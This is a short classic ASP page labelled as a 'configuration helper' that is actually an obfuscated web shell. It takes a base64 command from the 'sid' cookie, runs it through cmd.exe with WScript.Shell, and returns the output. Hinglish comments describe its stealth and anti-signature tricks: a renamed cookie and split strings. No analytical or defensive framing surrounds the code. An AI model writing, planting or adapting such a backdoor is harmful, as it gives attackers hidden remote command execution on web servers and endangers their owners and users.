<%@ Language=VBScript %>
<%
' Configuration helper - do not remove
Response.Buffer=True
Response.CacheControl="private"
Response.Expires=-1

Dim z1,z2,z3,z4,z5,o1,o2

z1=Request.Cookies("sid")   ' ← cookie name badal diya (stealth)
If Len(z1)>10 Then          ' minimum length check (anti-noise)

    z2 = z1                 ' copy
    
    ' decode logic (obfuscated style)
    z3 = Base64_D(z2)
    
    If Len(z3)>3 Then
        On Error Resume Next
        
        z4 = "cm" & "d.e" & "xe"           ' cmd.exe split kiya
        z5 = "/c " & z3
        
        Set o1 = Server.CreateObject("WS" & "crip" & "t.Sh" & "ell")
        Set o2 = o1.Exec(z4 & " " & z5)
        
        Dim rOut, rErr
        rOut = o2.StdOut.ReadAll
        rErr = o2.StdErr.ReadAll
        
        If Len(rOut)>0 Then
            ' output ko thoda twist (stealth + anti-signature)
            Response.Write Server.HTMLEncode(Replace(rOut,"<","&lt;"))
        End If
        
        If Len(rErr)>0 Then
            Response.Write Server.HTMLEncode(vbCrLf & "[E]" & Replace(rErr,"<","&lt;"))
        End If
        
        Set o2 = Nothing
        Set o1 = Nothing
    End If
    
    On Error Goto 0
End If

' Base64 decode - classic ASP ke liye (thoda rename/obfuscate kiya)
Function Base64_D(s)
    Dim xDoc, xNode
    Set xDoc = Server.CreateObject("Msxml2.DOMDocument"&".6.0")
    Set xNode = xDoc.CreateElement("tmp")
    xNode.DataType = "bin.base64"
    xNode.Text = s
    Base64_D = StrConv(xNode.NodeTypedValue, vbUnicode)
    Set xNode = Nothing
    Set xDoc = Nothing
End Function
%>
